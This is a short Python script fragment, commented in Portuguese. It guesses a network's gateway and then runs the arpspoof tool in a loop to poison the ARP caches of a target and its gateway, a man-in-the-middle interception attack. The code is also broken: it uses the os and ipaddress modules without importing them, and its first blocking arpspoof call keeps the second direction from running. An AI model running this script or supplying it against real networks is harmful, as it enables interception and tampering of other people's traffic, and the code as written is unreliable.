import socket
import struct
import time

def calcular_gateway(rede):
    """
    Calcula o gateway da rede (assumindo que é o primeiro host válido).
    """
    rede_obj = ipaddress.ip_network(rede, strict=False)
    return str(next(rede_obj.hosts()))

def arp_spoof(interface, alvo_ip, gateway_ip):
    """
    Realiza o ARP spoofing entre o alvo e o gateway.
    """
    while True:
        try:
            # Spoof para o alvo
            os.system(f"arpspoof -i {interface} -t {alvo_ip} {gateway_ip}")
            # Spoof para o gateway
            os.system(f"arpspoof -i {interface} -t {gateway_ip} {alvo_ip}")
            time.sleep(2)
        except KeyboardInterrupt:
            print("\nSpoofing interrompido pelo usuário.")
            break